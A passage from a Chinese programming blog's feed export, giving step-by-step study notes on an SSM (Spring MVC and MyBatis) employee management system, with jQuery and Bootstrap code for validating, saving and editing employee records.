show_validate_msg(ele,status,msg)&#123;</span></span><br><span class="line"><span class="xml">        //清空这个元素之前的样式</span></span><br><span class="line"><span class="xml">        $(ele).parent().removeClass("has-success has-error");</span></span><br><span class="line"><span class="xml">        $(ele).next("span").text("");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        if(status == "success")&#123;</span></span><br><span class="line"><span class="xml">            $(ele).parent().addClass("has-success");</span></span><br><span class="line"><span class="xml">            $(ele).next("span").text(msg);</span></span><br><span class="line"><span class="xml">        &#125;else if(status == "error")&#123;</span></span><br><span class="line"><span class="xml">            $(ele).parent().addClass("has-error");</span></span><br><span class="line"><span class="xml">            $(ele).next("span").text(msg);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //校验用户名是否可用</span></span><br><span class="line"><span class="xml">    $("#empName_add_input").change(function () &#123;</span></span><br><span class="line"><span class="xml">        //发送ajax请求校验用户名是否可用</span></span><br><span class="line"><span class="xml">        var empName = this.value;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/checkUser",</span></span><br><span class="line"><span class="xml">            data:"empName="+empName,</span></span><br><span class="line"><span class="xml">            type:"POST",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                if(result.code == 200)&#123;</span></span><br><span class="line"><span class="xml">                    show_validate_msg("#empName_add_input","success","用户名可用");</span></span><br><span class="line"><span class="xml">                    $("#emp_save_btn").attr("ajax-va","success");</span></span><br><span class="line"><span class="xml">                &#125;else&#123;</span></span><br><span class="line"><span class="xml">                    show_validate_msg("#empName_add_input","error",result.extend.va_msg);</span></span><br><span class="line"><span class="xml">                    $("#emp_save_btn").attr("ajax-va","error");</span></span><br><span class="line"><span class="xml">                &#125;</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //点击保存，保存员工</span></span><br><span class="line"><span class="xml">    $("#emp_save_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //1.模态框中填写的表单数据提交给服务器进行保存</span></span><br><span class="line"><span class="xml">        //2.先对要提交给服务器的数据进行校验</span></span><br><span class="line"><span class="xml">        if(!validata_add_form())&#123;</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        //3.判断之前的ajax用户名校验是否成功</span></span><br><span class="line"><span class="xml">        if($(this).attr("ajax-va")=="error")&#123;</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        //4.发送ajax请求保存员工</span></span><br><span class="line"><span class="xml">        // alert($("#empAddModal form").serialize());</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emp",</span></span><br><span class="line"><span class="xml">            type:"POST",</span></span><br><span class="line"><span class="xml">            data:$("#empAddModal form").serialize(),</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                //alert(result.msg);</span></span><br><span class="line"><span class="xml">                if(result.code == 200)&#123;</span></span><br><span class="line"><span class="xml">                    //员工保存成功：</span></span><br><span class="line"><span class="xml">                    //1. 关闭模态框</span></span><br><span class="line"><span class="xml">                    $("#empAddModal").modal('hide');</span></span><br><span class="line"><span class="xml">                    //2. 来到最后一页，显示刚才保存的数据</span></span><br><span class="line"><span class="xml">                    //发送ajax请求显示最后一页数据即可</span></span><br><span class="line"><span class="xml">                    //可以将总记录数当作页码</span></span><br><span class="line"><span class="xml">                    to_page(totalRecords);</span></span><br><span class="line"><span class="xml">                &#125;else&#123;</span></span><br><span class="line"><span class="xml">                    //显示失败信息</span></span><br><span class="line"><span class="xml">                    // console.log(result);</span></span><br><span class="line"><span class="xml">                    //有哪个字段的错误信息，就显示哪个字段</span></span><br><span class="line"><span class="xml">                    if(undefined != result.extend.errorFields.email)&#123;</span></span><br><span class="line"><span class="xml">                        //显示邮箱错误信息</span></span><br><span class="line"><span class="xml">                        show_validate_msg("#email_add_input","error",result.extend.errorFields.email);</span></span><br><span class="line"><span class="xml">                    &#125;</span></span><br><span class="line"><span class="xml">                    if(undefined != result.extend.errorFields.empName)&#123;</span></span><br><span class="line"><span class="xml">                        //显示员工错误信息</span></span><br><span class="line"><span class="xml">                        show_validate_msg("#empName_add_input","error",result.extend.result.extend.errorFields.empName);</span></span><br><span class="line"><span class="xml">                    &#125;</span></span><br><span class="line"><span class="xml">                &#125;</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<h1 id="员工修改"><a href="#员工修改" class="headerlink" title="员工修改"></a>员工修改</h1><p>效果图：<br><img src="/img/JavaWeb/10-19学习日记/0.png" alt="avatar"></p>
<p>当点击编辑按钮时就会弹出这样一个模态框</p>
<ol>
<li><p>点击编辑</p>
</li>
<li><p>弹出用户修改的模态框（显示用户信息）</p>
</li>
<li><p>点击更新，完成用户修改</p>
</li>
</ol>
<p>由于很相似，所以就复制进行一点修改就好了</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">&lt;%--员工修改的模态框--%&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal fade"</span> id=<span class="string">"empUpdateModal"</span> tabindex=<span class="string">"-1"</span> role=<span class="string">"dialog"</span> aria-labelledby=<span class="string">"myModalLabel"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-dialog"</span> role=<span class="string">"document"</span>&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-content"</span>&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-header"</span>&gt;</span><br><span class="line">                &lt;button <span class="class"><span class="keyword">type</span></span>=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"close"</span> data-dismiss=<span class="string">"modal"</span> aria-label=<span class="string">"Close"</span>&gt;&lt;span aria-hidden=<span class="string">"true"</span>&gt;&amp;times;&lt;/span&gt;&lt;/button&gt;</span><br><span class="line">                &lt;h4 <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-title"</span>&gt;员工修改&lt;/h4&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-body"</span>&gt;</span><br><span class="line">                &lt;form <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-horizontal"</span>&gt;</span><br><span class="line">                    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">                        &lt;label <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-2 control-label"</span>&gt;empName&lt;/label&gt;</span><br><span class="line">                        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-10"</span>&gt;</span><br><span class="line">                            &lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"text"</span> name=<span class="string">"empName"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control"</span> id=<span class="string">"empName_update_input"</span> placeholder=<span class="string">"empName"</span>&gt;</span><br><span class="line">                            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"help-block"</span>&gt;&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">                        &lt;label <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-2 control-label"</span>&gt;email&lt;/label&gt;</span><br><span class="line">                        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-10"</span>&gt;</span><br><span class="line">                            &lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"text"</span> name=<span class="string">"email"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control"</span> id=<span class="string">"email_update_input"</span> placeholder=<span class="string">"email@qq.com"</span>&gt;</span><br><span class="line">                            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"help-block"</span>&gt;&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">                        &lt;label <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-2 control-label"</span>&gt;gender&lt;/label&gt;</span><br><span class="line">                        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-10"</span>&gt;</span><br><span class="line">                            &lt;label <span class="class"><span class="keyword">class</span></span>=<span class="string">"radio-inline"</span>&gt;</span><br><span class="line">                                &lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"radio"</span> name=<span class="string">"gender"</span> id=<span class="string">"gender1_update_input"</span> value=<span class="string">"M"</span> checked=<span class="string">"checked"</span>&gt; 男</span><br><span class="line">                            &lt;/label&gt;</span><br><span class="line">                            &lt;label <span class="class"><span class="keyword">class</span></span>=<span class="string">"radio-inline"</span>&gt;</span><br><span class="line">                                &lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"radio"</span> name=<span class="string">"gender"</span> id=<span class="string">"gender2_update_input"</span> value=<span class="string">"F"</span>&gt; 女</span><br><span class="line">                            &lt;/label&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">                        &lt;label <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-2 control-label"</span>&gt;deptName&lt;/label&gt;</span><br><span class="line">                        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-4"</span>&gt;</span><br><span class="line">                            &lt;%--                            部门提交部门id即可--%&gt;</span><br><span class="line">                            &lt;select <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control"</span> name=<span class="string">"dId"</span>&gt;</span><br><span class="line">                                &lt;%--  部门名称--%&gt;</span><br><span class="line">                            &lt;/select&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-footer"</span>&gt;</span><br><span class="line">                &lt;button <span class="class"><span class="keyword">type</span></span>=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-default"</span> data-dismiss=<span class="string">"modal"</span>&gt;关闭&lt;/button&gt;</span><br><span class="line">                &lt;button <span class="class"><span class="keyword">type</span></span>=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-primary"</span> id=<span class="string">"emp_update_btn"</span>&gt;更新&lt;/button&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>然后给按钮加上标识<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">var editBtn = <span class="constructor">$(<span class="string">"&lt;button&gt;&lt;/button&gt;"</span>)</span>.add<span class="constructor">Class(<span class="string">"btn btn-primary btn-sm edit_btn"</span>)</span></span><br><span class="line">    .append(<span class="constructor">$(<span class="string">"&lt;span&gt;&lt;/span&gt;"</span>)</span>.add<span class="constructor">Class(<span class="string">"glyphicon glyphicon-pencil"</span>)</span>).append(<span class="string">"编辑"</span>);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;button class="btn btn-danger btn-sm"&gt;</span></span><br><span class="line"><span class="comment"> &lt;span class="glyphicon glyphicon-trash" aria-hidden="true" /&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="comment"> 删除</span></span><br><span class="line"><span class="comment"> &lt;/button&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">var delBtn = <span class="constructor">$(<span class="string">"&lt;button&gt;&lt;/button&gt;"</span>)</span>.add<span class="constructor">Class(<span class="string">"btn btn-danger btn-sm delete_btn"</span>)</span></span><br><span class="line">    .append(<span class="constructor">$(<span class="string">"&lt;span&gt;&lt;/span&gt;"</span>)</span>.add<span class="constructor">Class(<span class="string">"glyphicon glyphicon-trash"</span>)</span>).append(<span class="string">"删除"</span>);</span><br></pre></td></tr></table></figure><br>别忘了还有绑定点击事件<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.按钮创建之前就绑定了click，所以绑定不上</span></span><br><span class="line"><span class="comment">//1).可以在创建按钮的时候绑定事件 2).live()</span></span><br><span class="line"><span class="comment">//jquery新版没有live，使用on方法进行替代</span></span><br><span class="line">$(<span class="built_in">document</span>).on(<span class="string">"click"</span>,<span class="string">".edit_btn"</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//alert("edit")</span></span><br><span class="line">    <span class="comment">//0.查出员工信息，显示员工信息</span></span><br><span class="line">    <span class="comment">//1.查出部门信息，并显示部门列表</span></span><br><span class="line"></span><br><span class="line">    getDepts(<span class="string">"#empUpdateModal select"</span>)</span><br><span class="line">    $(<span class="string">"#empUpdateModal"</span>).modal(&#123;</span><br><span class="line">        backdrop:<span class="string">"static"</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>现在的模态框和添加的模态框是一样的，所以我们还需要做一些修改</p>
<h2 id="显示信息"><a href="#显示信息" class="headerlink" title="显示信息"></a>显示信息</h2><p>效果图中，用户名是不能变得，所以从<a href="https://v3.bootcss.com/css/" target="_blank" rel="noopener">bootstrap全局样式</a>中找到表单的静态控件<br>实际上就加了一个p标签<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control-static"</span>&gt;email<span class="meta">@example</span>.com&lt;/p&gt;</span><br></pre></td></tr></table></figure></p>
<p>想要更新时保持不变并与其对应，那还是发送ajax请求，传到这个静态控件中<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control-static"</span> id=<span class="string">"empName_update_static"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>在EmployeeController中添加<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 按照员工id查询员工</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(value=<span class="meta-string">"/emp/&#123;id&#125;"</span>,method=RequestMethod.GET)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> Msg getEmp(<span class="meta">@PathVariable(<span class="meta-string">"id"</span>)</span> Integer id)&#123;</span><br><span class="line">    Employee employee = employeeService.getEmp(id);</span><br><span class="line">    <span class="keyword">return</span> Msg.success().add(<span class="string">"emp"</span>,employee);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>对应的Service中也添加上<br><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">public</span> Employee getEmp(Integer id) &#123;</span><br><span class="line">    <span class="attribute">Employee</span> employee = employeeMapper.<span class="literal">select</span>ByPrimaryKey(id);</span><br><span class="line">    <span class="attribute">return</span> employee;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>给编辑按钮添加一个自定义属性<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">var editBtn = <span class="constructor">$(<span class="string">"&lt;button&gt;&lt;/button&gt;"</span>)</span>.add<span class="constructor">Class(<span class="string">"btn btn-primary btn-sm edit_btn"</span>)</span></span><br><span class="line">    .append(<span class="constructor">$(<span class="string">"&lt;span&gt;&lt;/span&gt;"</span>)</span>.add<span class="constructor">Class(<span class="string">"glyphicon glyphicon-pencil"</span>)</span>).append(<span class="string">"编辑"</span>);</span><br><span class="line"><span class="comment">//为编辑按钮添加一个自定义的属性，来表示当前员工id</span></span><br><span class="line">editBtn.attr(<span class="string">"edit-id"</span>,item.empId);</span><br></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.按钮创建之前就绑定了click，所以绑定不上</span></span><br><span class="line"><span class="comment">//1).可以在创建按钮的时候绑定事件 2).live()</span></span><br><span class="line"><span class="comment">//jquery新版没有live，使用on方法进行替代</span></span><br><span class="line">$(<span class="built_in">document</span>).on(<span class="string">"click"</span>,<span class="string">".edit_btn"</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//alert("edit")</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.查出部门信息，并显示部门列表</span></span><br><span class="line">    getDepts(<span class="string">"#empUpdateModal select"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.查出员工信息，显示员工信息</span></span><br><span class="line">    getEmp($(<span class="keyword">this</span>).attr(<span class="string">"edit-id"</span>));</span><br><span class="line">    $(<span class="string">"#empUpdateModal"</span>).modal(&#123;</span><br><span class="line">        backdrop:<span class="string">"static"</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getEmp</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/emp/"</span>+id,</span><br><span class="line">        type:<span class="string">"GET"</span>,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// console.log(result);</span></span><br><span class="line">            <span class="keyword">var</span> empData = result.extend.emp;</span><br><span class="line">            $(<span class="string">"#empName_update_static"</span>).text(empData.empName);</span><br><span class="line">            $(<span class="string">"#email_update_input"</span>).val(empData.email);</span><br><span class="line">            $(<span class="string">"#empUpdateModal input[name=gender]"</span>).val([empData.gender]);</span><br><span class="line">            $(<span class="string">"#empUpdateModal select"</span>).val([empData.dId]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里基本的显示就完成了</p>
<h2 id="更新信息"><a href="#更新信息" class="headerlink" title="更新信息"></a>更新信息</h2><p>在EmployeeController中添加上<br><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 员工更新方法</span></span><br><span class="line"><span class="comment"> * @param employee</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">@ResponseBody</span></span><br><span class="line"><span class="variable">@RequestMapping</span>(value = <span class="string">"/emp/&#123;empId&#125;"</span>,method = RequestMethod.PUT)</span><br><span class="line">public Msg saveEmp(Employee employee)&#123;</span><br><span class="line">    <span class="selector-tag">employeeService</span><span class="selector-class">.updateEmp</span>(employee);</span><br><span class="line">    <span class="selector-tag">return</span> <span class="selector-tag">Msg</span><span class="selector-class">.success</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>Service中也对应添加<br><figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 员工更新</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> employee</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">updateEmp</span><span class="params">(Employee employee)</span></span>&#123;</span><br><span class="line">    employeeMapper.updateByPrimaryKeySelective(employee);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在index.jsp中添加上点击事件<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//点击更新，更新员工信息</span></span><br><span class="line">$(<span class="string">"#emp_update_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.验证邮箱是否合法</span></span><br><span class="line">    <span class="keyword">var</span> email = $(<span class="string">"#email_update_input"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> regEmaill = <span class="regexp">/^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!regEmaill.test(email))&#123;</span><br><span class="line">        <span class="comment">// alert("邮箱格式不正确");</span></span><br><span class="line">        show_validate_msg(<span class="string">"#email_update_input"</span>,<span class="string">"error"</span>,<span class="string">"邮箱格式不正确"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_validate_msg(<span class="string">"#email_update_input"</span>,<span class="string">"success"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//2.发送ajax请求，保存更新的员工数据</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/emp/"</span>+$(<span class="keyword">this</span>).attr(<span class="string">"edit-id"</span>),</span><br><span class="line">        type:<span class="string">"POST"</span>,</span><br><span class="line">        data:$(<span class="string">"#empUpdateModal form"</span>).serialize()+<span class="string">"&amp;_method=PUT"</span>,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            alert(result.msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>这样就完成了更新的基本操作</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>SSM</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>SSM-2020/10/16-员工管理系统-3</title>
    <url>/2020/10/16/SSM-2020-10-16-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h1><p>URI：</p>
<ul>
<li><p>/emp/{id}   GET 查询员工</p>
</li>
<li><p>/emp    POST保存员工</p>
</li>
<li><p>/emp/{id}   PUT修改员工</p>
</li>
<li><p>/emp/{id}   DELETE删除员工</p>
</li>
</ul>
<p>首先添加一个点击事件，点击保存的时候，完成保存事件<br><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"#emp_save_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.模态框中填写的表单数据提交给服务器进行保存</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>给保存按钮添加上<code>id=emp_save_btn</code></p>
<p>接着在EmployeeController中添加方法<br><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="variable">@RequestMapping</span>(value = <span class="string">"/emp"</span>,method = RequestMethod.POST)</span><br><span class="line"><span class="variable">@ResponseBody</span></span><br><span class="line">public Msg saveEmp(Employee employee)&#123;</span><br><span class="line">    <span class="selector-tag">employeeService</span><span class="selector-class">.saveEmp</span>(employee);</span><br><span class="line">    <span class="selector-tag">return</span> <span class="selector-tag">Msg</span><span class="selector-class">.success</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>EmployeeService中对应的写方法</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 员工保存方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public void save<span class="constructor">Emp(Employee <span class="params">employee</span>)</span>&#123;</span><br><span class="line">    employeeMapper.insert<span class="constructor">Selective(<span class="params">employee</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着完善点击事件</p>
<p>由于需要ajax请求保存员工，但是一个一个取出员工数据太过于麻烦，所以就需要请出一生噩梦，序列化与反序列化</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="comment">//alert($("#empAddModal form").serialize());</span></span><br><span class="line"></span><br><span class="line">$.ajax(&#123;</span><br><span class="line"><span class="symbol">    url:</span><span class="string">"$&#123;APP_PATH&#125;/emp"</span>,</span><br><span class="line"><span class="symbol">    type:</span><span class="string">"POST"</span>,</span><br><span class="line"><span class="symbol">    data:</span>$(<span class="string">"#empAddModal form"</span>).serialize()</span><br></pre></td></tr></table></figure>
<p>我们还想要再点击保存之后关闭模态框并且转到最后一页来显示刚才的数据</p>
<p>访问一下<a href="https://v3.bootcss.com/javascript/#modals-methods" target="_blank" rel="noopener">bootstarp模态框</a><br>找到关闭模态框的方法<br><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"#empAddModal"</span>).modal(<span class="string">'hide'</span>);</span><br></pre></td></tr></table></figure></p>
<p>来到最后一页要面临一个问题就是当该页已经有5个数据，再添加一个数据，页码就会加一，这个时候不用担心，插件会自动帮我们完成，我们只需要发送ajax请求最后一页数据即可，但是又担心调用to_page方法不够保险，就可以请求总记录数当页码</p>
<p>定义一个全局遍历totalRecords<br><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">totalRecords</span> = result.extend.pageInfo.total<span class="comment">;</span></span><br></pre></td></tr></table></figure><br>然后用to_page请求就好了<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">to</span><span class="constructor">_page(<span class="params">totalRecords</span>)</span>;</span><br></pre></td></tr></table></figure></p>
<p>完整的保存<br><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"#emp_save_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.模态框中填写的表单数据提交给服务器进行保存</span></span><br><span class="line">    <span class="comment">//2.发送ajax请求保存员工</span></span><br><span class="line">    <span class="comment">// alert($("#empAddModal form").serialize());</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/emp"</span>,</span><br><span class="line">        type:<span class="string">"POST"</span>,</span><br><span class="line">        data:$(<span class="string">"#empAddModal form"</span>).serialize(),</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//alert(result.msg);</span></span><br><span class="line">            <span class="comment">//员工保存成功：</span></span><br><span class="line">            <span class="comment">//1. 关闭模态框</span></span><br><span class="line">            $(<span class="string">"#empAddModal"</span>).modal(<span class="string">'hide'</span>);</span><br><span class="line">            <span class="comment">//2. 来到最后一页，显示刚才保存的数据</span></span><br><span class="line">            <span class="comment">//发送ajax请求显示最后一页数据即可</span></span><br><span class="line">            <span class="comment">//可以将总记录数当作页码</span></span><br><span class="line">            to_page(totalRecords);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>这下点击保存之后，就会自动跳转到最后一页并关闭模态框了</p>
<p>但是目前只是基本完成了保存功能，但是没有校验输入的信息，这就需要编写一下娇艳的逻辑了</p>
<h2 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h2><h3 id="合法性校验"><a href="#合法性校验" class="headerlink" title="合法性校验"></a>合法性校验</h3><p>输入数据以后不能直接完成保存，必须要进行校验</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//校验表单数据</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validata_add_form</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//1. 拿到要检验的数据，使用正则表达式</span></span><br><span class="line">    <span class="keyword">var</span> empName = $(<span class="string">"#empName_add_input"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> regName = <span class="regexp">/(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\u2E80-\u9FFF]&#123;2,5&#125;)/</span>;</span><br><span class="line">    <span class="keyword">if</span>(!regName.test(empName))&#123;</span><br><span class="line">        alert(<span class="string">"用户名可以是2-5位中文或6-16位英文和数字的组合"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//2. 校验邮箱信息</span></span><br><span class="line">    <span class="keyword">var</span> email = $(<span 